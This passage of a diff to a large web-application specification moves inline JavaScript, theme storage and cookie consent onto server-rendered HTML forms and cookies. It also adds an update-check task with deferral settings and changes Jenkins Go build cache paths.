 | Responsive design | CSS media queries | Never - always CSS |
@@ -25895,26 +25959,52 @@ Quick reference: Default allows all origins (`*`). Configure via `web.cors` in s
 - **Required for**: API calls, dynamic content loading, complex state, WebSockets
 - **Size matters** - keep JS minimal, no large libraries for simple tasks
 
-**Inline JavaScript - Allowed for simple operations:**
+**Simple Operations - Native HTML First, External JS Second (NEVER Inline):**
+
+Inline `onclick` handlers are blocked by the CSP (script-src `'self'` allows no inline script) and violate the NO Inline CSS/JS rule. Many "one-liner" buttons need no JS at all:
+
 ```html
-<!-- Navigation -->
-<button onclick="history.back()">Go Back</button>
-<button onclick="history.forward()">Go Forward</button>
-<button onclick="location.reload()">Refresh</button>
+<!-- Reset form - native, zero JS -->
+<button type="reset">Reset Form</button>
 
-<!-- Print -->
-<button onclick="window.print()">Print</button>
-
-<!-- Scroll -->
-<button onclick="window.scrollTo(0,0)">Back to Top</button>
-
-<!-- Form helpers -->
-<button onclick="document.getElementById('myform').reset()">Reset Form</button>
-<button onclick="document.getElementById('field').select()">Select All</button>
+<!-- Back to top - anchor link, zero JS; smoothness is CSS -->
+<a href="#top" class="back-to-top">Back to Top</a>
 ```
 
-**Rule:** Inline JS is fine for one-liner operations that cannot be done with CSS/HTML5.
-Move to `static/js/app.js` if logic needs feedback, reuse, or exceeds one statement.
+```css
+/* Smooth scrolling for anchor links - respect reduced-motion preference */
+html { scroll-behavior: smooth; }
+@media (prefers-reduced-motion: reduce) {
+  html { scroll-behavior: auto; }
+}
+```
+
+Operations that genuinely need JS (history, print, text selection) are bound in `static/js/app.js` by `data-action` attribute:
+
+```html
+<button data-action="back">Go Back</button>
+<button data-action="forward">Go Forward</button>
+<button data-action="reload">Refresh</button>
+<button data-action="print">Print</button>
+<button data-action="select-all" data-target="field">Select All</button>
+```
+
+```javascript
+// static/js/app.js - one delegated listener, no inline handlers
+document.addEventListener('click', (e) => {
+  const btn = e.target.closest('[data-action]');
+  if (!btn) return;
+  switch (btn.dataset.action) {
+    case 'back': history.back(); break;
+    case 'forward': history.forward(); break;
+    case 'reload': location.reload(); break;
+    case 'print': window.print(); break;
+    case 'select-all': document.getElementById(btn.dataset.target).select(); break;
+  }
+});
+```
+
+**Rule:** No inline JS, ever - even one-liners live in `static/js/app.js`.
 See **JavaScript Rules** section below for `app.js` structure.
 
 **CSS-First Patterns (use these instead of JS):**
@@ -26186,24 +26276,29 @@ html.theme-light {
 **Theme preference source:**
 | Context | Preference Source | Fallback |
 |---------|-------------------|----------|
-| Public (guest) | `localStorage.theme` | `dark` |
+| Public (guest) | `theme` cookie (server-readable) | `dark` |
 | Public (user) | `user_preferences.theme` | `dark` |
 | Admin | `admin_preferences.theme` | `dark` |
 
-**JavaScript theme switching (shared):**
+**Theme switching (shared):**
 
-**Note:** Per "HTML5 & CSS Over JavaScript" rules - CSS does all theming via variables. JavaScript ONLY handles preference detection and class switching (cannot be done in pure CSS).
+**Note:** Per "HTML5 & CSS Over JavaScript" rules - the SERVER reads the theme preference (cookie or DB) and renders the `theme-*` class on `<html>`, so every page loads with the correct theme and zero JS. `auto` renders `theme-auto`, which is pure CSS via `prefers-color-scheme` - no `matchMedia` detection needed. The toggle itself is a small POST form that sets the cookie / saves the preference; external JS only enhances it to swap the class without a reload.
+
+```css
+/* theme-auto follows the OS preference - pure CSS, no JS detection */
+@media (prefers-color-scheme: light) {
+  html.theme-auto { /* same variables as html.theme-light */ }
+}
+@media (prefers-color-scheme: dark) {
+  html.theme-auto { /* same variables as html.theme-dark */ }
+}
+```
 
 ```javascript
-// Same function works for both public and admin
-// JS only sets the class - CSS does all the actual styling
+// No-reload enhancement only - the POST form + theme cookie is the source of truth
 function setTheme(theme) {
-  if (theme === 'auto') {
-    const prefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
-    theme = prefersDark ? 'dark' : 'light';
-  }
   document.documentElement.className = `theme-${theme}`;
-  localStorage.setItem('theme', theme);
+  document.cookie = `theme=${theme}; path=/; max-age=31536000; SameSite=Lax`;
 }
 ```
 
@@ -26331,12 +26426,14 @@ function closeModal(id) {
 }
 
 // ============================================================================
-// Form helpers
+// Form helpers - NO native confirm() (forbidden); use a native <dialog>
 // ============================================================================
-function confirmDelete(form, message = 'Are you sure?') {
-  if (confirm(message)) {
-    form.submit();
-  }
+function confirmDelete(form, dialogId = 'confirm-modal') {
+  const dialog = document.getElementById(dialogId);
+  dialog.addEventListener('close', () => {
+    if (dialog.returnValue === 'confirm') form.submit();
+  }, { once: true });
+  dialog.showModal();
 }
 ```
 
@@ -26347,11 +26444,12 @@ function confirmDelete(form, message = 'Are you sure?') {
 - Form validation (complex only)
 - Dynamic content loading (AJAX)
 - WebSocket connections
+- `data-action` bindings for history/print/select helpers (see "Simple Operations" above)
 
-**What stays inline (simple one-liners):**
-- `onclick="history.back()"`
-- `onclick="window.print()"`
-- `onclick="this.closest('dialog').close()"`
+**What never needs JS at all (native HTML/CSS):**
+- Closing a dialog: `<form method="dialog"><button>Cancel</button></form>`
+- Resetting a form: `<button type="reset">`
+- Back to top: `<a href="#top">` + `scroll-behavior: smooth`
 
 ### Template Rules
 
@@ -26827,9 +26925,9 @@ var staticFS embed.FS
 
 | NEVER Use | ALWAYS Use Instead |
 |-----------|---------------------|
-| `alert()` | Custom modal with CSS classes |
-| `confirm()` | Custom confirmation modal |
-| `prompt()` | Custom input modal or inline form |
+| `alert()` | Native `<dialog>` styled with CSS classes |
+| `confirm()` | Native `<dialog>` confirmation with `<form method="dialog">` buttons |
+| `prompt()` | Native `<dialog>` with an input, or inline form |
 | Plain text inputs for options | Dropdowns (`<select>`) |
 | Plain text for yes/no | Checkboxes or toggle switches |
 | Plain text for multiple options | Radio buttons or dropdown |
@@ -26911,7 +27009,7 @@ var staticFS embed.FS
 - **Theme switching MUST work seamlessly** without page reload
 - **All interactive elements MUST be clearly visible** in both themes
 - **Syntax highlighting MUST adapt** to theme (use appropriate colors for each theme)
-- **User preference persisted** in localStorage or cookie
+- **User preference persisted** in the `theme` cookie (guests) or per-user DB preference (logged-in users) - server-readable, so pages render themed without JS
 - **Default to dark** if no preference set
 
 **Theme Implementation Location:**
@@ -26981,20 +27079,19 @@ var ThemePaletteLight = ThemePalette{
 
 **Theme Detection Flow:**
 ```
-1. Check user preference in localStorage/cookie
+1. Server reads user preference: theme cookie (guests) or DB preference (logged-in)
 2. If no preference OR preference is "auto":
-   - Check system preference via prefers-color-scheme media query
-   - Apply matching theme (light or dark)
+   - Server renders theme-auto class; CSS prefers-color-scheme media query
+     applies light or dark - no JS detection
 3. If preference is "light" or "dark":
-   - Apply selected theme directly
+   - Server renders theme-light / theme-dark on <html> directly
 4. Default to dark if all detection fails
 ```
 
 **Theme Switching:**
-- Provide theme toggle in UI (☀️ Light / 🌙 Dark / 🔄 Auto)
-- Store preference in `localStorage.theme` or cookie
-- Apply theme class to `<html>` element: `theme-light`, `theme-dark`
-- NO page reload required - instant switching via CSS classes
+- Provide theme toggle in UI (☀️ Light / 🌙 Dark / 🔄 Auto) as a POST form that sets the `theme` cookie (or saves the DB preference) - works without JS
+- Apply theme class to `<html>` element: `theme-light`, `theme-dark`, `theme-auto`
+- NO page reload required when JS is available - external JS intercepts the toggle and swaps the CSS class instantly
 - All components (Swagger, GraphQL, admin) switch simultaneously
 
 **Accessibility Requirements:**
@@ -28019,17 +28116,19 @@ When admin edits `custom_html`, show:
 | **Buttons (mobile)** | Centered below message, side-by-side |
 | **Decline button** | Text/outline style, no background |
 | **"I Agree" button** | Filled white background, purple text |
-| **Persistence** | Remember choice in localStorage, don't show again |
+| **Persistence** | Remember choice in the `cookie_consent` COOKIE (server-readable), don't render again |
 | **Z-index** | Above all content, below modals |
 
 ### Banner Behavior
 
+**The server decides whether to render the banner: no `cookie_consent` cookie → render it; cookie present → skip it entirely.** Accept/Decline/Save are standard `<form method="post">` submits handled server-side (set the cookie, redirect back) - the banner works fully without JavaScript. External JS is a no-reload enhancement only.
+
 | Action | Result |
 |--------|--------|
-| **I Agree** | Set `cookieConsent=accepted` in localStorage, hide banner, enable all cookies + tracking |
-| **Decline** | Set `cookieConsent=declined` in localStorage, hide banner, session cookies only |
-| **Already set** | Don't show banner if localStorage has cookieConsent |
-| **First visit** | Always show banner until user responds |
+| **I Agree** | POST to `/server/consent` sets `cookie_consent` cookie (all categories), redirect back; enable all cookies + tracking |
+| **Decline** | POST to `/server/consent` sets `cookie_consent` cookie (essential only), redirect back; session cookies only |
+| **Already set** | Server does not render the banner when the `cookie_consent` cookie exists |
+| **First visit** | Server renders the banner (no cookie yet) until user responds |
 
 ### Implementation
 
@@ -28053,169 +28152,92 @@ message := cfg.Privacy.GetConsentMessage()
 ```
 
 ```html
-<!-- Cookie Consent Banner - ALWAYS shown until user responds (we use cookies) -->
+<!-- Cookie Consent Banner - server renders it ONLY when no cookie_consent cookie exists -->
+<!-- No hidden-by-default + JS reveal: the server decides, so it works without JS -->
 <!-- {message} is dynamically selected based on server.privacy.data.sold -->
-<div id="cookie-consent" class="cookie-banner cookie-banner--hidden" data-sold="{data_sold}">
+{{ if not .HasConsentCookie }}
+<div id="cookie-consent" class="cookie-banner" data-sold="{data_sold}">
   <div class="cookie-banner-content">
     <span class="cookie-message">
       {message} - <a href="{policy_url}" class="policy-link">{policy_text}</a>
     </span>
     <div class="cookie-buttons">
-      <button class="btn-decline" onclick="declineCookies()">{decline_text}</button>
-      <button class="btn-accept" onclick="acceptCookies()">{accept_text}</button>
+      <!-- Plain POST forms - the server sets the cookie_consent cookie and redirects back -->
+      <form method="post" action="/server/consent">
+        <input type="hidden" name="choice" value="decline">
+        <button class="btn-decline" type="submit">{decline_text}</button>
+      </form>
+      <form method="post" action="/server/consent">
+        <input type="hidden" name="choice" value="accept">
+        <button class="btn-accept" type="submit">{accept_text}</button>
+      </form>
     </div>
   </div>
 </div>
+{{ end }}
+```
 
-<script>
-// Granular consent state (matches server.privacy.cookies structure)
-const defaultConsent = {
-  // Always true, cannot be disabled
-  essential: true,
-  // Default from server.privacy.cookies.preferences.enabled
-  preferences: true,
-  // Default from server.privacy.cookies.analytics.enabled
-  analytics: true,
-  timestamp: 0
-};
+**Server-side consent handler:**
 
-// Show banner if no prior consent (we always use cookies)
-(function() {
-  const stored = localStorage.getItem('cookieConsent');
-  const banner = document.getElementById('cookie-consent');
-
-  // No consent yet - show banner
-  if (!stored && banner) {
-    banner.classList.remove('cookie-banner--hidden');
-  }
-
-  // Has consent - apply settings
-  if (stored) {
-    try {
-      const consent = JSON.parse(stored);
-      applyConsent(consent);
-    } catch (e) {
-      // Legacy format or corrupted - show banner again
-      localStorage.removeItem('cookieConsent');
-      if (banner) banner.classList.remove('cookie-banner--hidden');
+```go
+// POST /server/consent - sets the cookie_consent cookie and redirects back.
+// The banner works with zero JavaScript; JS only removes the reload.
+func handleConsent(w http.ResponseWriter, r *http.Request) {
+    choice := r.FormValue("choice")
+    consent := ConsentState{Essential: true, Timestamp: time.Now().Unix()}
+    switch choice {
+    case "accept":
+        consent.Preferences = true
+        consent.Analytics = true
+    case "decline":
+        // Essential only
+    case "save":
+        // Granular preferences from the Manage Preferences form
+        consent.Preferences = r.FormValue("preferences") == "on"
+        consent.Analytics = r.FormValue("analytics") == "on"
     }
-  }
-})();
-
-function acceptCookies() {
-  // Accept all cookies
-  const consent = {
-    essential: true,
-    preferences: true,
-    analytics: true,
-    timestamp: Date.now()
-  };
-  saveAndApplyConsent(consent);
+    b, _ := json.Marshal(consent)
+    http.SetCookie(w, &http.Cookie{
+        Name: "cookie_consent", Value: url.QueryEscape(string(b)),
+        Path: "/", MaxAge: 31536000, SameSite: http.SameSiteLaxMode,
+    })
+    http.Redirect(w, r, safeReferrer(r), http.StatusSeeOther)
 }
+```
 
-function declineCookies() {
-  // Essential only
-  const consent = {
-    essential: true,
-    preferences: false,
-    analytics: false,
-    timestamp: Date.now()
-  };
-  saveAndApplyConsent(consent);
-}
+**External JS enhancement (`static/js/app.js`) - no-reload only, consent state lives in the cookie:**
 
-function showCookiePreferences() {
-  // Show granular preferences modal (see Granular Consent UI in PART 12)
-  document.getElementById('cookie-preferences-modal').style.display = 'block';
-}
+```javascript
+// Enhance the consent forms: submit via fetch, hide the banner without a reload.
+// The cookie is still set server-side; nothing is stored in localStorage.
+document.querySelectorAll('#cookie-consent form').forEach((form) => {
+  form.addEventListener('submit', async (e) => {
+    e.preventDefault();
+    await fetch(form.action, { method: 'POST', body: new FormData(form) });
+    document.getElementById('cookie-consent').remove();
+    // Analytics for an "accept" choice loads on next page view via the
+    // server-side {{ trackingScript }} template function
+  });
+});
 
-function savePreferences() {
-  // Called from preferences modal
-  const consent = {
-    // Always true
-    essential: true,
-    preferences: document.getElementById('pref-preferences').checked,
-    analytics: document.getElementById('pref-analytics').checked,
-    timestamp: Date.now()
-  };
-  saveAndApplyConsent(consent);
-  document.getElementById('cookie-preferences-modal').style.display = 'none';
-}
+// Manage Preferences opens a native <dialog> (focus trap, Esc, backdrop built in);
+// its Save button is a normal POST to /server/consent with choice=save.
+// The no-JS fallback is the /server/privacy page, which renders the same form inline.
+document.querySelectorAll('[data-action="cookie-preferences"]').forEach((btn) => {
+  btn.addEventListener('click', () => {
+    document.getElementById('cookie-preferences-modal').showModal();
+  });
+});
+```
 
-function saveAndApplyConsent(consent) {
-  localStorage.setItem('cookieConsent', JSON.stringify(consent));
-  document.getElementById('cookie-consent').classList.add('cookie-banner--hidden');
-  applyConsent(consent);
-}
+**CCPA "Do Not Sell" (only when `server.privacy.data.sold = true`):**
 
-function applyConsent(consent) {
-  // Essential cookies always work (sessions, CSRF)
+The opt-out is a POST form on the privacy page; the server sets the `ccpa_opt_out=true` cookie (and downgrades `cookie_consent` to essential-only) and reads it on every request - see `privacyData()` in PART 12. No localStorage, no JS required; external JS may enhance the form for no-reload feedback.
 
-  // Preference cookies (theme, language)
-  if (consent.preferences) {
-    document.cookie = "preferencesEnabled=true; path=/; max-age=31536000";
-  }
+**Banner CSS (`static/css/components.css` - never inline):**
 
-  // Analytics (only if enabled AND server.tracking configured)
-  if (consent.analytics) {
-    loadTracking();
-  }
-}
-
-function loadTracking() {
-  // Load analytics if server.tracking is configured
-  // Tracking script is injected server-side via {{ trackingScript }} template function
-  // This function is called after user accepts cookies
-}
-
-// CCPA "Do Not Sell" - only shown when server.privacy.data.sold = true
-function initCCPA() {
-  const banner = document.getElementById('cookie-consent');
-  const dataSold = banner?.dataset.sold === 'true';
-
-  if (dataSold) {
-    // Check for existing "Do Not Sell" preference
-    const doNotSell = localStorage.getItem('ccpaDoNotSell') === 'true';
-    if (doNotSell) {
-      // Apply immediately - no third-party data sharing
-      applyCCPAOptOut();
-    }
-  }
-}
-
-function ccpaDoNotSell() {
-  // User opted out of data sales (CCPA right)
-  localStorage.setItem('ccpaDoNotSell', 'true');
-  applyCCPAOptOut();
-
-  // Also decline non-essential cookies
-  const consent = {
-    essential: true,
-    preferences: false,
-    analytics: false,
-    timestamp: Date.now(),
-    ccpaOptOut: true
-  };
-  saveAndApplyConsent(consent);
-}
-
-function applyCCPAOptOut() {
-  // Disable any third-party data sharing
-  // - Block analytics if configured
-  // - Set GPC (Global Privacy Control) signal
-  document.cookie = "ccpa_opt_out=true; path=/; max-age=31536000";
-}
-
-// Initialize CCPA on page load
-initCCPA();
-</script>
-
-<style>
+```css
 /* Cookie Consent Banner - matches reference design */
-.cookie-banner--hidden {
-  display: none;
-}
-
 .cookie-banner {
   position: fixed;
   bottom: 0;
@@ -28300,16 +28322,15 @@ initCCPA();
     padding: 0.5rem 1.25rem;
   }
 }
-</style>
 ```
 
 ### Consent Logic (Granular)
 
-**Consent stored as JSON:** `{"essential":true,"preferences":true,"analytics":false,"timestamp":1704067200}`
+**Consent stored as JSON in the `cookie_consent` cookie:** `{"essential":true,"preferences":true,"analytics":false,"timestamp":1704067200}`
 
 | Condition | Show Banner | Essential | Preferences | Analytics |
 |-----------|-------------|-----------|-------------|-----------|
-| No localStorage (first visit) | **Yes** | Yes (always) | Wait | Wait |
+| No `cookie_consent` cookie (first visit) | **Yes** | Yes (always) | Wait | Wait |
 | Accept All clicked | No | Yes | **Yes** | **Yes** (if `server.tracking` configured) |
 | Decline clicked | No | Yes | No | No |
 | Custom preferences saved | No | Yes | User choice | User choice |
@@ -28333,7 +28354,7 @@ initCCPA();
 | **Analytics/Tracking** | **NEVER loaded** | No tracking scripts injected, no data sent to analytics providers |
 | **Preference cookies** | **NOT set** | Theme defaults to system/dark, language defaults to browser/en |
 | **Essential cookies** | **Still work** | Session, CSRF, auth tokens required for app to function |
-| **localStorage** | **Minimal** | Only `cookieConsent` stored to remember decline |
+| **localStorage** | **Nothing** | Consent choice lives in the `cookie_consent` cookie (essential) - localStorage is never used for consent |
 | **Third-party scripts** | **NOT loaded** | No Google Analytics, Matomo, etc. |
 | **Embedded content** | **Placeholder shown** | YouTube, social embeds show "Content blocked" placeholder |
 
@@ -28341,7 +28362,7 @@ initCCPA();
 ```
 ✓ Session cookie (required for login/auth)
 ✓ CSRF token cookie (required for form security)
-✓ Remember decline choice (localStorage)
+✓ Remember decline choice (`cookie_consent` cookie - itself essential)
 ✓ Basic functionality (browse, view content)
 ```
 
@@ -28389,10 +28410,11 @@ func trackingScript(r *http.Request) template.HTML {
 {{ end }}
 
 <!-- Show placeholder for blocked embeds -->
+<!-- Link works without JS; external JS upgrades it to open the preferences <dialog> -->
 {{ if not preferencesAllowed }}
   <div class="embed-blocked">
     <p>External content blocked due to cookie preferences.</p>
-    <button onclick="showCookiePreferences()">Manage Preferences</button>
+    <a href="/server/privacy#cookie-preferences" data-action="cookie-preferences">Manage Preferences</a>
   </div>
 {{ else }}
   <!-- Actual embed -->
@@ -28553,8 +28575,15 @@ func trackingScript(r *http.Request) template.HTML {
     <p>We do not use analytics tracking on this site.</p>
     {{ end }}
 
-    <div class="manage-cookies">
-      <button onclick="showCookiePreferences()">Manage Cookie Preferences</button>
+    <!-- Granular preferences rendered inline - plain POST form, works without JS -->
+    <div class="manage-cookies" id="cookie-preferences">
+      <form method="post" action="/server/consent">
+        <input type="hidden" name="choice" value="save">
+        <label><input type="checkbox" checked disabled> Essential cookies (always on)</label>
+        <label><input type="checkbox" name="preferences" {{ if .Consent.Preferences }}checked{{ end }}> Preference cookies</label>
+        <label><input type="checkbox" name="analytics" {{ if .Consent.Analytics }}checked{{ end }}> Analytics cookies</label>
+        <button type="submit">Save Cookie Preferences</button>
+      </form>
     </div>
   </section>
 
@@ -28647,7 +28676,7 @@ func trackingScript(r *http.Request) template.HTML {
       <li><strong>Deletion:</strong> Delete your account and all associated data permanently.</li>
       {{ end }}
       <li><strong>Correction:</strong> Update or correct your personal information anytime.</li>
-      <li><strong>Cookie Control:</strong> <a href="#" onclick="showCookiePreferences()">Manage your cookie preferences</a></li>
+      <li><strong>Cookie Control:</strong> <a href="/server/privacy#cookie-preferences">Manage your cookie preferences</a></li>
     </ul>
   </section>
 
@@ -28666,14 +28695,21 @@ func trackingScript(r *http.Request) template.HTML {
     <div class="ccpa-opt-out-box">
       <h3>Do Not Sell My Personal Information</h3>
       <p>Click the button below to opt out of the sale of your personal information.</p>
+      <!-- Plain POST forms - server sets/clears the ccpa_opt_out cookie, works without JS -->
       {{ if .CCPAOptedOut }}
       <div class="ccpa-status opted-out">
         <span class="status-icon">✓</span>
         <span>You have opted out of data sales.</span>
       </div>
-      <button class="btn-secondary" onclick="ccpaOptIn()">Opt Back In</button>
+      <form method="post" action="/server/ccpa">
+        <input type="hidden" name="choice" value="opt-in">
+        <button class="btn-secondary" type="submit">Opt Back In</button>
+      </form>
       {{ else }}
-      <button class="btn-primary btn-ccpa-opt-out" onclick="ccpaDoNotSell()">Do Not Sell My Personal Information</button>
+      <form method="post" action="/server/ccpa">
+        <input type="hidden" name="choice" value="opt-out">
+        <button class="btn-primary btn-ccpa-opt-out" type="submit">Do Not Sell My Personal Information</button>
+      </form>
       {{ end }}
     </div>
 
@@ -28764,7 +28800,7 @@ func trackingScript(r *http.Request) template.HTML {
 - `content.consent_message`: From `GetConsentMessage()` (returns sold/not-sold message)
 - `content.data_usage`: From `GetDataUsageContent()` (returns sold/not-sold content)
 - `ccpa.applicable`: `true` only when `data.sold = true`
-- `ccpa` object: only included in the response when `data.sold = true`; `ccpa.user_opted_out` reflects the client's localStorage/cookie opt-out check
+- `ccpa` object: only included in the response when `data.sold = true`; `ccpa.user_opted_out` reflects the server-side check of the `ccpa_opt_out` cookie
 
 **Note:** The `tracking` and `third_party.services` fields are populated based on `server.tracking` config. If no tracking is configured, they remain empty.
 
@@ -28802,6 +28838,13 @@ func trackingScript(r *http.Request) template.HTML {
 | Captcha | Captcha | Yes | Spam prevention |
 
 **Submission sends to `server.contact.general.email` (or falls back to `server.contact.admin.email` if general is empty).**
+
+**Below the form, the page MUST render exactly two informational sections — the content is spec'd here; never improvise it:**
+
+| Section | Content |
+|---------|---------|
+| Security Issues | "To report a security vulnerability, consult our security policy at `/server/security`." — rendered as a link to `/server/security`. Never point users at the raw `/.well-known/security.txt` file from this page. |
+| Abuse Reports | "To report abusive content or policy violations, use this contact form." — append " or email {abuse_email}" where `{abuse_email}` resolves to `server.contact.abuse.email` if set, else `server.contact.general.email` if set; omit the email clause entirely when neither is set. NEVER render `server.contact.admin.email` here (it is never public). |
 
 ### /server/help
 
@@ -32947,6 +32990,7 @@ Every project MUST include these scheduled tasks:
 | `geoip_update` | Weekly (Sunday 03:00) | Download/update ip-location-db GeoIP databases | Yes |
 | `blocklist_update` | Daily at 04:00 | Download/update IP/domain blocklists | Yes |
 | `cve_update` | Daily at 05:00 | Download/update CVE/security databases | Yes |
+| `update_check` | Daily at 06:00 | Check release channel for a newer version — notify-only unless `update.auto_install: true` (default false); honors `update.defer_days` | Yes |
 | `session_cleanup` | Every 15 minutes | Remove expired sessions | No |
 | `token_cleanup` | Every 15 minutes | Remove expired tokens | No |
 | `log_rotation` | Daily at 00:00 | Rotate and compress old logs | No |
@@ -32995,6 +33039,11 @@ server:
         enabled: true
         retry_on_fail: true
         retry_delay: 1h
+
+      # Daily at 06:00 (after cve_update at 05:00) - check-only unless update.auto_install is true
+      update_check:
+        schedule: "0 6 * * *"
+        enabled: true
 
       # Every 15 minutes
       session_cleanup:
@@ -33122,7 +33171,9 @@ In cluster mode, tasks are distributed to prevent duplicate execution:
 - `ssl_renewal`
 - `geoip_update`
 - `blocklist_update`
+- `cve_update`
 - `backup_daily`
+- `update_check` (the check and notification run once; with `auto_install: true` the install is rolled out node-by-node — never all nodes at once, so the cluster stays available)
 
 **Local Tasks (run on each node):**
 - `session_cleanup`
@@ -35683,6 +35734,62 @@ POST /api/{api_version}/server/{admin_path}/config/backup/restore
 {project_name} --update branch daily
 {project_name} --update branch stable
 ```
+
+## Update Configuration
+
+```yaml
+server:
+  update:
+    # Release channel: stable | beta | daily (also settable via --update branch)
+    branch: stable
+
+    # Auto-install updates found by the update_check task
+    # Default OFF: the task only notifies; installing is always an explicit operator decision
+    auto_install: false
+
+    # Defer window in days (0-365): a release is only eligible once it is this many days old
+    # 30 = adopt releases only after they have been public for 30 days; 0 = immediately
+    defer_days: 0
+```
+
+**`--update branch {name}` writes `update.branch` to the config file — the config is the single source of truth; there is no separate CLI-side state.**
+
+### Channel Semantics
+
+**Channels are cumulative — a less-stable channel never leaves you older than a more-stable one.**
+
+| Channel | Considers | Selection |
+|---------|-----------|-----------|
+| `stable` (default) | Full releases only (`v*`, `*.*.*`) | Newest stable |
+| `beta` | Beta pre-releases (`*-beta`) + all stable releases | Newest of both — beta users are never stuck behind a stable release |
+| `daily` | Daily pre-releases (`YYYYMMDDHHMMSS`) + beta + stable | Newest overall |
+
+### Defer Semantics (`defer_days`)
+
+**A release is eligible only once `now - published_at >= defer_days` (GitHub Releases `published_at`, UTC).**
+
+| Rule | Behavior |
+|------|----------|
+| Gates the scheduled task only | `update_check` skips ineligible releases for BOTH notification and auto-install; manual `--update check` / `--update yes` always see and install the true latest — an explicit operator action overrides the defer window |
+| Eligibility is per-release | The task selects the NEWEST eligible release that is newer than the running version. A brand-new release does not reset the clock for older, already-eligible releases |
+| Rolling delay, never deadlock | Rapid release cadence (e.g. `daily` channel + `defer_days: 30`) still converges: each run adopts the newest release that has aged past the window |
+| Example | Running v1.2.2; v1.2.3 published 40 days ago, v1.2.4 published 5 days ago, `defer_days: 30` → task notifies/installs v1.2.3; v1.2.4 becomes eligible 25 days later |
+
+### Scheduled Check (update_check Task)
+
+**The `update_check` scheduler task (built-in task list, daily at 06:00, skippable) runs the equivalent of `--update check` against the configured channel, filtered by `defer_days`.**
+
+| Setting | Behavior |
+|---------|----------|
+| `auto_install: false` (default) | Notify only — fires the "Update available" event; never touches the binary |
+| `auto_install: true` | Runs the full `--update yes` flow during the task run — eligible releases only |
+
+**Surfacing rules:**
+
+- "Update available" surfaces ONLY to Server Admins: Banner + Notification Center on `/server/{admin_path}/*` routes, plus the `update_available` email event (off by default)
+- Fires once per version — the banner persists until updated or dismissed; dismissing suppresses that version only, the next release notifies again
+- NEVER on public pages — running-version and update status are Tier 3 information (Public Endpoint Safety Principle, PART 11), and update prompts are operator concerns, not visitor concerns
+- PWA exception: the service-worker "A new version is available" banner is allowed on app pages — an installed PWA is an app updating its own frontend assets; it discloses no server version
 
 ## Self-Update Implementation
 
@@ -42003,7 +42110,7 @@ pipeline {
                                 --name "${PROJECT_NAME}-$(tr -dc 'a-z0-9' </dev/urandom | head -c8)" \
                                 -v ${WORKSPACE}:/app \
                                 -v ${GO_CACHE:-$HOME/go/pkg/mod}:/usr/local/share/go/pkg/mod \
-                                -v ${GO_BUILD:-$HOME/.cache/go-build}:/usr/local/share/go/cache \
+                                -v ${GO_BUILD:-$HOME/.cache/go-build/${PROJECT_NAME}}:/usr/local/share/go/cache \
                                 -w /app \
                                 -e CGO_ENABLED=0 \
                                 -e GOOS=linux \
@@ -42021,7 +42128,7 @@ pipeline {
                                 --name "${PROJECT_NAME}-$(tr -dc 'a-z0-9' </dev/urandom | head -c8)" \
                                 -v ${WORKSPACE}:/app \
                                 -v ${GO_CACHE:-$HOME/go/pkg/mod}:/usr/local/share/go/pkg/mod \
-                                -v ${GO_BUILD:-$HOME/.cache/go-build}:/usr/local/share/go/cache \
+                                -v ${GO_BUILD:-$HOME/.cache/go-build/${PROJECT_NAME}}:/usr/local/share/go/cache \
                                 -w /app \
                                 -e CGO_ENABLED=0 \
                                 -e GOOS=linux \
@@ -42040,7 +42147,7 @@ pipeline {
                                 --name "${PROJECT_NAME}-$(tr -dc 'a-z0-9' </dev/urandom | head -c8)" \
                                 -v ${WORKSPACE}:/app \
                                 -v ${GO_CACHE:-$HOME/go/pkg/mod}:/usr/local/share/go/pkg/mod \
-                                -v ${GO_BUILD:-$HOME/.cache/go-build}:/usr/local/share/go/cache \
+                                -v ${GO_BUILD:-$HOME/.cache/go-build/${PROJECT_NAME}}:/usr/local/share/go/cache \
                                 -w /app \
                                 -e CGO_ENABLED=0 \
                                 -e GOOS=darwin \
@@ -42058,7 +42165,7 @@ pipeline {
                                 --name "${PROJECT_NAME}-$(tr -dc 'a-z0-9' </dev/urandom | head -c8)" \
                                 -v ${WORKSPACE}:/app \
                                 -v ${GO_CACHE:-$HOME/go/pkg/mod}:/usr/local/share/go/pkg/mod \
-                                -v ${GO_BUILD:-$HOME/.cache/go-build}:/usr/local/share/go/cache \
+                                -v ${GO_BUILD:-$HOME/.cache/go-build/${PROJECT_NAME}}:/usr/local/share/go/cache \
                                 -w /app \
                                 -e CGO_ENABLED=0 \
                                 -e GOOS=darwin \
@@ -42077,7 +42184,7 @@ pipeline {
                                 --name "${PROJECT_NAME}-$(tr -dc 'a-z0-9' </dev/urandom | head -c8)" \
                                 -v ${WORKSPACE}:/app \
                                 -v ${GO_CACHE:-$HOME/go/pkg/mod}:/usr/local/share/go/pkg/mod \
-                                -v ${GO_BUILD:-$HOME/.cache/go-build}:/usr/local/share/go/cache \
+                                -v ${GO_BUILD:-$HOME/.cache/go-build/${PROJECT_NAME}}:/usr/local/share/go/cache \
                                 -w /app \
                                 -e CGO_ENABLED=0 \
                                 -e GOOS=windows \
@@ -42095,7 +42202,7 @@ pipeline {
                                 --name "${PROJECT_NAME}-$(tr -dc 'a-z0-9' </dev/urandom | head -c8)" \
                                 -v ${WORKSPACE}:/app \
                                 -v ${GO_CACHE:-$HOME/go/pkg/mod}:/usr/local/share/go/pkg/mod \
-                                -v ${GO_BUILD:-$HOME/.cache/go-build}:/usr/local/share/go/cache \
+                                -v ${GO_BUILD:-$HOME/.cache/go-build/${PROJECT_NAME}}:/usr/local/share/go/cache \
                                 -w /app \
                                 -e CGO_ENABLED=0 \
                                 -e GOOS=windows \
@@ -42114,7 +42221,7 @@ pipeline {
                                 --name "${PROJECT_NAME}-$(tr -dc 'a-z0-9' </dev/urandom | head -c8)" \
                                 -v ${WORKSPACE}:/app \
                                 -v ${GO_CACHE:-$HOME/go/pkg/mod}:/usr/local/share/go/pkg/mod \
-                                -v ${GO_BUILD:-$HOME/.cache/go-build}:/usr/local/share/go/cache \
+                                -v ${GO_BUILD:-$HOME/.cache/go-build/${PROJECT_NAME}}:/usr/local/share/go/cache \
                                 -w /app \
                                 -e CGO_ENABLED=0 \
                                 -e GOOS=freebsd \
@@ -42132,7 +42239,7 @@ pipeline {
                                 --name "${PROJECT_NAME}-$(tr -dc 'a-z0-9' </dev/urandom | head -c8)" \
                                 -v ${WORKSPACE}:/app \
                                 -v ${GO_CACHE:-$HOME/go/pkg/mod}:/usr/local/share/go/pkg/mod \
-                                -v ${GO_BUILD:-$HOME/.cache/go-build}:/usr/local/share/go/cache \
